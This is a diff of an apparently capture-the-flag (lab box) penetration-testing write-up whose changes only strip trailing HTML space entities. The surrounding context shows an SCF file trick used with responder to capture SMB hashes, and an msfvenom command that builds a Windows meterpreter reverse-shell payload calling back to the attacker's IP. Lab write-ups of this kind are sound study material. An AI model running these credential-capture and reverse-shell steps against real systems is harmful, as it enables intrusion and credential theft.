@@ -17,7 +17,7 @@ PORT     STATE SERVICE
 5985/tcp open  wsman
 ```
 
-Interestingly, WinRM is open.&#x20;
+Interestingly, WinRM is open.
 
 ### SCF Exploit -> Creds
 
@@ -37,7 +37,7 @@ This would take any file and upload them to the file share, and a user would ope
 
 {% embed url="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" %}
 
-This uses the SCF file to access our machine via SMB, and `responder` would capture the hash. Create an SCF file like so and start `responder`.&#x20;
+This uses the SCF file to access our machine via SMB, and `responder` would capture the hash. Create an SCF file like so and start `responder`.
 
 ```
 [Shell]
@@ -90,7 +90,7 @@ This, combined with the box name was a hint that we had to expoloit this specifi
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f exe -o meter.exe
 ```
 
-Then, we need to upload it and start `exploit/multi/handler`.&#x20;
+Then, we need to upload it and start `exploit/multi/handler`.
 
 <figure><img src="../../../.gitbook/assets/image (2321).png" alt=""><figcaption></figcaption></figure>
 
